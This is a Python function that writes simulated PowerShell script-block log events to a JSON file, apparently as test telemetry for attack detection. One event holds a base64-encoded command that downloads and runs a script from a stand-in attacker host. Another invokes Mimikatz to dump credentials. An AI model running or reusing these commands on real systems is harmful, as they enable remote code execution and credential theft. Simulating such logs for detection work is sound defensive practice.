import json
from datetime import datetime
from loguru import logger
from pathlib import Path

def simulate(output_path: str = "./logs/collected/powershell_logs.json"):
    """
    Simulates PowerShell-based attacks.
    """
    logger.info("Simulating PowerShell Attack...")
    
    events = [
        {
            "EventID": 4104,
            "timestamp": datetime.now().isoformat(),
            "ScriptBlockText": "powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFMAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYQB0AHQAYQBjAGsAZQByAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAIgApAA==",
            "User": "CONTOSO\\jsmith"
        },
        {
            "EventID": 4104,
            "timestamp": datetime.now().isoformat(),
            "ScriptBlockText": "Invoke-Mimikatz -DumpCreds",
            "User": "CONTOSO\\jsmith"
        }
    ]

    Path(output_path).parent.mkdir(parents=True, exist_ok=True)
    with open(output_path, 'w') as f:
        json.dump(events, f, indent=4)
    
    logger.info(f"PowerShell simulation complete. Logs written to {output_path}")
